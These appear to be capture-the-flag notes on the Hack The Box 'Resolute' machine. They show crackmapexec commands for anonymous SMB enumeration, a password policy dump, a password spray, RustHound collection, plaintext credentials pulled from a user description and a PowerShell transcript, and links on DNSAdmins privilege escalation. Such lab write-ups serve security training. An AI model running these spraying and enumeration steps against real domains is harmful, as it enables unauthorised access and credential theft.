#### Nmap
```txt
Open 10.129.96.155:53
Open 10.129.96.155:88
Open 10.129.96.155:135
Open 10.129.96.155:139
Open 10.129.96.155:389
Open 10.129.96.155:445
Open 10.129.96.155:464
Open 10.129.96.155:593
Open 10.129.96.155:636
Open 10.129.96.155:3268
Open 10.129.96.155:3269
Open 10.129.96.155:5985 (winrm)
```

#### SMB
 __Domain name:__ `megabank.local`
- Anonymous login successful - nothing found

```bash
 crackmapexec smb $IP -u "" -p "" --pass-pol
```
__Pass Pol__
```txt
Minimum password length: 7
Password history length: 24
Maximum password age: Not Set

Minimum password age: 1 day 4 minutes
Reset Account Lockout Counter: 30 minutes
Locked Account Duration: 30 minutes
Account Lockout Threshold: None
Forced Log off Time: Not Set
```
```bash
crackmapexec smb $IP -u "" -p "" --users
```
- Found users and password in one user's description

_Creds:_ `marko:Welcome123!` - but don't work

__Password spray__
```bash
crackmapexec smb $IP -u samaccountnames.txt -p 'Welcome123!'
```

_Creds:_ `melanie:Welcome123!`

#### LDAP
- Attempting bind success! Binded as: None

#### RustHound
```bash
 rusthound -d megabank.LOCAL -u melanie@megabank.LOCAL -p Welcome123! -i $IP  -o HTB/AD/Resolute/rusthound -z
```

#### Privsec
- `ls -force` found hidden file in a nested hidden folders: `C:/PSTranscripts/20191203/PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt`
- Found creds in that script:
```powershell
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
 ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```
_Creds:_ `ryan:Serv3r4Admin4cc123!`

- Ryan is member of `Contractors` and `Contractors` is member of `DNSAdmins`

[DNS exe Persistence](https://github.com/dim0x69/dns-exe-persistance)
[Nikhil Mittal Blog](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
